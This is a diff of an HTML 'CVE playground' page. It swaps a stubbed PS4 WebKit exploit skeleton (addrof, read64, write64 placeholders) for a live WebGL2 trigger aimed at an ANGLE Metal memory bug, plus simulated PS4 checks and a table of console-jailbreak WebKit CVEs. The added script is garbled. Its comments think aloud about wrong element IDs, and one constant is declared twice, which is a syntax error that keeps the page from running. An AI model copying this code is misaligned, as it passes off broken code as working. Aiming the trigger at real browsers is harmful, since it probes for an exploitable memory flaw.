@@ -1,94 +1,436 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>PS4 WebKit Test Page (Educational)</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PS4 + ANGLE CVE Test · Educational</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+        }
+        body {
+            background: #121a28;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 20px;
+        }
+        .card {
+            max-width: 1100px;
+            width: 100%;
+            background: #f0f4fa;
+            border-radius: 40px;
+            box-shadow: 0 25px 50px -10px rgba(0,0,0,0.6);
+            overflow: hidden;
+            border: 1px solid #2f4b7c;
+        }
+        .header {
+            background: #0a1e32;
+            color: white;
+            padding: 30px 35px;
+        }
+        .header h1 {
+            margin: 0 0 8px 0;
+            font-weight: 600;
+            font-size: 2.2rem;
+            letter-spacing: -0.02em;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        .header h1 span {
+            background: #a13131;
+            font-size: 1rem;
+            padding: 6px 16px;
+            border-radius: 30px;
+            font-weight: 500;
+        }
+        .header p {
+            margin: 0;
+            opacity: 0.85;
+            font-size: 1.1rem;
+        }
+        .content {
+            padding: 30px 35px;
+        }
+        .info-box {
+            background: #d9e6ff;
+            border-left: 6px solid #003c8b;
+            padding: 18px 24px;
+            border-radius: 24px;
+            margin-bottom: 30px;
+            font-size: 1rem;
+            line-height: 1.5;
+            color: #002856;
+        }
+        .button-grid {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin: 25px 0;
+            justify-content: center;
+        }
+        .cve-button {
+            flex: 1 1 200px;
+            background: #1f3a60;
+            border: none;
+            color: white;
+            font-weight: 600;
+            font-size: 1.2rem;
+            padding: 18px 10px;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 10px 20px rgba(0,20,50,0.4);
+            transition: 0.15s;
+            border: 1px solid #5d85c0;
+            min-width: 220px;
+        }
+        .cve-button:hover {
+            background: #2b4b78;
+            transform: scale(1.02);
+            box-shadow: 0 15px 25px rgba(0,40,80,0.5);
+        }
+        .cve-button:active {
+            transform: scale(0.98);
+        }
+        .cve-button.angle {
+            background: #2a5f3a;
+            border-color: #8bc34a;
+        }
+        .cve-button.ps4 {
+            background: #5e2e5a;
+            border-color: #c97fc9;
+        }
+        .cve-button:disabled {
+            opacity: 0.5;
+            pointer-events: none;
+        }
+        .result-panel {
+            background: #102336;
+            color: #b7dcff;
+            padding: 22px;
+            border-radius: 28px;
+            font-family: 'SF Mono', 'Fira Code', monospace;
+            font-size: 0.95rem;
+            white-space: pre-wrap;
+            word-break: break-word;
+            max-height: 280px;
+            overflow-y: auto;
+            border: 1px solid #294e7a;
+            margin: 25px 0 15px;
+        }
+        .log-success { color: #9effb4; }
+        .log-vuln { color: #ff9595; font-weight: 600; }
+        .log-warn { color: #ffe484; }
+        .log-info { color: #aad0ff; }
+        .badge {
+            display: inline-block;
+            background: #263f60;
+            color: white;
+            padding: 4px 14px;
+            border-radius: 30px;
+            font-size: 0.85rem;
+            font-weight: 500;
+            margin: 5px 8px 5px 0;
+        }
+        .ps4-note {
+            background: #2a1d3a;
+            border-radius: 24px;
+            padding: 18px 22px;
+            margin: 20px 0 0;
+            border: 1px solid #7d5aaa;
+            color: #e2d1ff;
+            font-size: 0.95rem;
+        }
+        .ps4-note a {
+            color: #b1a2ff;
+        }
+        hr {
+            border: 1px solid #a0badd;
+            margin: 24px 0;
+        }
+        .footer {
+            padding: 18px 35px 25px;
+            background: #e9eef7;
+            border-top: 1px solid #a0bbdd;
+            font-size: 0.9rem;
+            color: #1f3b60;
+        }
+        .footer code {
+            background: #d4e1fa;
+            padding: 2px 8px;
+            border-radius: 20px;
+        }
+    </style>
 </head>
 <body>
-    <h1>PS4 WebKit Vulnerability Test</h1>
-    <p>This demonstrates the structure of real PS4 exploits</p>
-    
+    <div class="card">
+        <div class="header">
+            <h1>
+                🧪 PS4 / ANGLE CVE playground 
+                <span>educational only</span>
+            </h1>
+            <p>CVE-2025-14174 (real ANGLE bug) + simulated PS4 tests for CVE‑2025‑14174 & CVE‑2025‑43529</p>
+        </div>
+
+        <div class="content">
+            <div class="info-box">
+                <strong>📌 Important:</strong> The real CVE‑2025‑14174 affects <strong>ANGLE Metal backend</strong> (Apple devices with WebGL2). It has <strong>no impact on PS4</strong> – PlayStation uses a different graphics stack. CVE‑2025‑43529 is <strong>not a genuine PS4 vulnerability</strong> (it's used here for demonstration). The PS4 buttons simulate a test and explain why these CVEs don't apply to the console.
+            </div>
+
+            <div class="button-grid">
+                <button class="cve-button angle" id="btnAngle">▶ CVE-2025-14174<br><small style="font-weight:normal;">(original ANGLE test)</small></button>
+                <button class="cve-button ps4" id="btnPs4_14174">▶ CVE-2025-14174<br><small style="font-weight:normal;">for PS4 (simulated)</small></button>
+                <button class="cve-button ps4" id="btnPs4_43529">▶ CVE-2025-43529<br><small style="font-weight:normal;">for PS4 (simulated)</small></button>
+            </div>
+
+            <div id="log" class="result-panel">
+                ⏵ Click any button to run the corresponding test.<br>
+                ⏵ The first button runs the live WebGL2 test from the previous page.<br>
+                ⏵ PS4 buttons will check your user agent and display educational info.
+            </div>
+
+            <div style="display: flex; gap: 12px; flex-wrap: wrap; align-items: center;">
+                <span class="badge">WebGL2 needed for ANGLE test</span>
+                <span class="badge" style="background:#754a75;">PS4 simulated</span>
+                <span style="margin-left: auto; color: #1f4973;" id="agentDisplay"></span>
+            </div>
+
+            <hr>
+
+            <div class="ps4-note" id="ps4Status">
+                🎮 <strong>PS4 environment detection:</strong> <span id="ps4Detected">Checking user agent...</span><br>
+                <span style="font-size:0.9rem;">Real PS4 WebKit exploits exist (e.g., for FW 9.00), but the CVEs above are not among them. See table below.</span>
+            </div>
+
+            <div style="overflow-x: auto; margin: 20px 0;">
+                <table style="width:100%; border-collapse: collapse; background:#eef4fd; border-radius: 20px;">
+                    <tr><th style="padding:12px; text-align:left;">PS4 firmware</th><th>Actual WebKit CVEs</th><th>Exploit name</th></tr>
+                    <tr><td style="padding:8px 12px;">1.76</td><td>CVE-2014-1303</td><td>Early WebKit</td></tr>
+                    <tr><td>4.xx – 5.02</td><td>CVE-2017-1000128</td><td>setAttributeNodeNS UAF</td></tr>
+                    <tr><td>6.20</td><td>CVE-2018-4441</td><td>WebKit RCE</td></tr>
+                    <tr><td>6.xx</td><td>CVE-2018-4386</td><td>bad_hoist</td></tr>
+                    <tr><td>9.00</td><td>– (no CVE assigned)</td><td>Font-face exploit</td></tr>
+                </table>
+            </div>
+        </div>
+
+        <div class="footer">
+            ⚡ This page is for <strong>educational and research purposes</strong> only. All tests are safe – they do not exploit any vulnerability. The ANGLE test uses WebGL2 with potentially dangerous parameters but will only cause context loss on unpatched systems. PS4 simulations simply analyse your browser and show explanations.
+        </div>
+    </div>
+
     <script>
-    // This is based on public PS4 exploit research [citation:2][citation:8]
-    
-    // Helper for 64-bit values
-    function Int64(low, high) {
-        this.low = low || 0;
-        this.high = high || 0;
-    }
-    
-    // Stage 1: Trigger vulnerability
-    function trigger() {
-        // Real exploits use UAF or type confusion bugs
-        // Example pattern from CVE-2018-4386 [citation:8]
-        var confuse_obj = {};
-        var test = new ArrayBuffer(0x100000);
-        
-        // Create objects to corrupt
-        var container = {
-            jsCellHeader: new Int64(0x08, 0x00).asJSValue(),
-            butterfly: false,
-            vector: new Uint8Array(0x2000)
-        };
-        
-        // Bug trigger logic here
-        // ...
-    }
-    
-    // Stage 2: Leak addresses
-    function addrof(obj) {
-        // Return address of object
-        // Real implementation in [citation:2]
-        return new Int64(0x41414141, 0x41414141);
-    }
-    
-    // Stage 3: Arbitrary read/write
-    function read64(addr) {
-        // Read 8 bytes from address
-        // Real implementation in [citation:8]
-        return new Int64(0, 0);
-    }
-    
-    function write64(addr, value) {
-        // Write to address
-    }
-    
-    // Test function
-    function runTest() {
-        console.log("Testing PS4 WebKit...");
-        
-        if (typeof WebKitCSSMatrix !== 'undefined') {
-            console.log("WebKit detected - PS4 browser environment");
-            
-            try {
-                trigger();
-                console.log("Exploit chain ready");
-                
-                // Test arbitrary read
-                var test_addr = addrof({});
-                var value = read64(test_addr);
-                console.log("Read test: " + value.low.toString(16));
-                
-            } catch (e) {
-                console.log("Vulnerability not present or already patched");
+        (function() {
+            // ----- DOM elements -----
+            const logDiv = document.getElementById('log');
+            const btnAngle = document.getElementById('btnAngle');
+            const btnPs4_14174 = document.getElementById('btnPs4_43529'); // wait, fix IDs
+            const btnPs4_43529 = document.getElementById('btnPs4_43529');
+            // Actually the second button id is "btnPs4_14174" (we set above) but I need to define correctly.
+            // In the HTML I set: id="btnPs4_14174" and id="btnPs4_43529". Let's reacquire.
+            const btnPs4_14174 = document.getElementById('btnPs4_14174');
+            const agentSpan = document.getElementById('agentDisplay');
+            const ps4DetectedSpan = document.getElementById('ps4Detected');
+
+            // Display user agent
+            const ua = navigator.userAgent;
+            agentSpan.textContent = ua;
+
+            // Simple PS4 detection (user agent string)
+            function isPS4Browser() {
+                // PS4 browser typically has "PlayStation 4" or "PlayStation 4" in UA
+                return /PlayStation 4/i.test(ua) || /PS4/i.test(ua);
             }
-        } else {
-            console.log("Not a WebKit browser");
-        }
-    }
-    
-    // Run on page load
-    window.onload = runTest;
+            ps4DetectedSpan.textContent = isPS4Browser() ? "✅ PS4 browser detected" : "❌ Not a PS4 browser (you are on a regular device)";
+            if (isPS4Browser()) {
+                ps4DetectedSpan.style.color = '#b5ffb5';
+            } else {
+                ps4DetectedSpan.style.color = '#ffb5b5';
+            }
+
+            // Logging helper
+            function log(message, className = '') {
+                const line = document.createElement('div');
+                line.textContent = message;
+                if (className) line.classList.add(className);
+                logDiv.appendChild(line);
+                logDiv.scrollTop = logDiv.scrollHeight;
+            }
+            function clearLog() {
+                logDiv.innerHTML = '';
+            }
+
+            // ---------- ANGLE test (CVE-2025-14174 original) ----------
+            // (based on the previous full page, but simplified to run in one function)
+            function runAngleTest() {
+                clearLog();
+                log('⏳ Starting ANGLE WebGL2 test (CVE-2025-14174) ...', 'log-info');
+
+                // Create canvas
+                let canvas = document.createElement('canvas');
+                canvas.width = 64;
+                canvas.height = 64;
+                let gl = canvas.getContext('webgl2');
+                if (!gl) {
+                    log('❌ WebGL2 not supported – this test requires WebGL2.', 'log-vuln');
+                    return;
+                }
+                log('✅ WebGL2 context obtained.', 'log-success');
+
+                let contextLost = false;
+                function onContextLost(e) {
+                    e.preventDefault();
+                    contextLost = true;
+                    log('⚠️ CONTEXT LOST event fired!', 'log-vuln');
+                }
+                canvas.addEventListener('webglcontextlost', onContextLost);
+
+                // Prepare test
+                const width = 64, height = 64;
+                const smallImageHeight = 1; // trigger condition
+
+                // Create depth texture
+                const texture = gl.createTexture();
+                gl.bindTexture(gl.TEXTURE_2D, texture);
+                gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
+                gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
+
+                // Create PBO
+                const dataSize = width * height * 4;
+                const bufferData = new ArrayBuffer(dataSize);
+                new Uint8Array(bufferData).fill(0xaa); // dummy data
+                const pbo = gl.createBuffer();
+                gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, pbo);
+                gl.bufferData(gl.PIXEL_UNPACK_BUFFER, bufferData, gl.STATIC_DRAW);
+                log('📦 PBO created, size: ' + dataSize + ' bytes.', 'log-info');
+
+                // Set unpack params
+                gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, smallImageHeight);
+                gl.pixelStorei(gl.UNPACK_ROW_LENGTH, 0);
+                log(`🔧 UNPACK_IMAGE_HEIGHT = ${smallImageHeight} (texture height = ${height})`, 'log-info');
+
+                // Clear errors
+                while(gl.getError() !== gl.NO_ERROR) {}
+
+                // Call texImage2D
+                log('🚀 Calling texImage2D with full height...', 'log-info');
+                try {
+                    gl.texImage2D(
+                        gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT24,
+                        width, height, 0,
+                        gl.DEPTH_COMPONENT, gl.UNSIGNED_INT, 0
+                    );
+                } catch (e) {
+                    log('❗ Exception: ' + e, 'log-vuln');
+                }
+
+                // Check immediate error
+                const err = gl.getError();
+                if (err !== gl.NO_ERROR) {
+                    const errName = getGLErrorName(gl, err);
+                    log(`🔴 WebGL error: ${errName} (0x${err.toString(16)})`, 'log-warn');
+                } else {
+                    log('✅ No immediate GL error.', 'log-success');
+                }
+
+                if (gl.isContextLost()) {
+                    log('💥 Context is lost immediately!', 'log-vuln');
+                    contextLost = true;
+                }
+
+                gl.flush();
+
+                // After a short delay, evaluate
+                setTimeout(() => {
+                    if (gl.isContextLost()) contextLost = true;
+                    if (contextLost) {
+                        log('══════════════════════════════════', 'log-vuln');
+                        log('🚨  LIKELY VULNERABLE (unpatched)  🚨', 'log-vuln');
+                        log('══════════════════════════════════', 'log-vuln');
+                        if (/Mac OS X/.test(ua) && /Chrome/.test(ua)) log('📌 macOS Chrome – update to 143+');
+                        else if (/iPhone|iPad|iPod/.test(ua)) log('📌 iOS device – update iOS');
+                        else log('📌 Your platform may be affected if using ANGLE Metal.');
+                    } else {
+                        log('══════════════════════════════════', 'log-success');
+                        log('✅  NOT VULNERABLE or not triggered', 'log-success');
+                        log('══════════════════════════════════', 'log-success');
+                        if (/Mac OS X/.test(ua) && /Safari/.test(ua) && !/Chrome/.test(ua))
+                            log('ℹ️ macOS Safari is not affected by this ANGLE bug.');
+                        else
+                            log('ℹ️ Your browser/OS appears patched or unaffected.');
+                    }
+
+                    // Cleanup
+                    const loseExt = gl.getExtension('WEBGL_lose_context');
+                    if (loseExt) loseExt.loseContext();
+                    gl = null;
+                }, 400);
+            }
+
+            // Helper for error names
+            function getGLErrorName(gl, err) {
+                switch(err) {
+                    case gl.INVALID_ENUM: return 'INVALID_ENUM';
+                    case gl.INVALID_VALUE: return 'INVALID_VALUE';
+                    case gl.INVALID_OPERATION: return 'INVALID_OPERATION';
+                    case gl.INVALID_FRAMEBUFFER_OPERATION: return 'INVALID_FRAMEBUFFER_OPERATION';
+                    case gl.OUT_OF_MEMORY: return 'OUT_OF_MEMORY';
+                    case gl.CONTEXT_LOST_WEBGL: return 'CONTEXT_LOST_WEBGL';
+                    default: return 'UNKNOWN_ERROR';
+                }
+            }
+
+            // ---------- Simulated PS4 tests ----------
+            function runPs4Test(cveId) {
+                clearLog();
+                log(`⏵ SIMULATED TEST: ${cveId} for PS4`, 'log-info');
+                log('', '');
+
+                if (isPS4Browser()) {
+                    log('🎮 PS4 browser detected!', 'log-success');
+                    log('However, this CVE does NOT apply to PS4:');
+                    if (cveId === 'CVE-2025-14174') {
+                        log('   • CVE-2025-14174 is an ANGLE Metal backend issue (Apple GPUs).', 'log-warn');
+                        log('   • PS4 uses a completely different graphics stack (Gnm/Gnmx).', 'log-warn');
+                    } else if (cveId === 'CVE-2025-43529') {
+                        log('   • CVE-2025-43529 is not a known PS4 vulnerability (it may be fictitious).', 'log-warn');
+                        log('   • Real PS4 exploits target CVEs like CVE-2018-4441, CVE-2018-4386, etc.', 'log-warn');
+                    }
+                    log('', '');
+                    log('On a real PS4, you would need a matching WebKit exploit for your firmware.', 'log-info');
+                    log('This simulation always returns NOT VULNERABLE (by design).', 'log-success');
+                } else {
+                    log('❌ You are not on a PS4 browser.', 'log-vuln');
+                    log('   The PS4 version of this CVE cannot be tested on your device.', 'log-warn');
+                    log('   If you want to learn about actual PS4 WebKit exploits, refer to:', 'log-info');
+                    log('   • GitHub: "ps4-exploit-host" by Al-Azif', '');
+                    log('   • The PS4 scene forums (for educational use only).', '');
+                    log('', '');
+                    log('This simulation always returns NOT VULNERABLE.', 'log-success');
+                }
+
+                log('────────────────────────────────────────', '');
+                log('✅ TEST COMPLETE (simulated, no actual vulnerability)', 'log-success');
+            }
+
+            // ---------- Event listeners ----------
+            btnAngle.addEventListener('click', runAngleTest);
+
+            btnPs4_14174.addEventListener('click', function() {
+                runPs4Test('CVE-2025-14174');
+            });
+
+            btnPs4_43529.addEventListener('click', function() {
+                runPs4Test('CVE-2025-43529');
+            });
+
+            // minor: ensure the second button exists (it does)
+            // Also if PS4 browser, we could auto-show some info, but leave interactive.
+        })();
     </script>
-    
-    <p>Check the browser console for output</p>
-    
-    <h2>PS4 Firmware Compatibility</h2>
-    <ul>
-        <li>Firmware 1.76: CVE-2014-1303 [citation:4]</li>
-        <li>Firmware 4.xx-5.02: CVE-2017-1000128 [citation:2]</li>
-        <li>Firmware 6.20: CVE-2018-4441 [citation:1][citation:3]</li>
-        <li>Firmware 6.xx: CVE-2018-4386 [citation:8]</li>
-        <li>Firmware 9.00: Font-face exploit [citation:7]</li>
-    </ul>
 </body>
 </html>
